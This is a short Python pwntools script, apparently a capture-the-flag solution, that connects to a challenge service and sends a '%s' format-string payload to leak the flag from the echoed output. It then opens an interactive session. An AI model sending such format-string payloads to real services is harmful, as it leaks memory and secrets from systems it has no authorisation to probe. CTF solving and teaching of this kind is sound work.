#!/usr/bin/env python3

from pwn import *

HOST = "echochamber.deadface.io"  # Remote host IP
PORT = 13337  # Remote port

def conn():
    p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    p.sendlineafter(b"Enter your message: ", b"%s")
    p.recvuntil(b"Echo: ")
    
    flag = p.recvline().strip(b"\n").decode()
    print(f"FLAG: {flag}")

    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

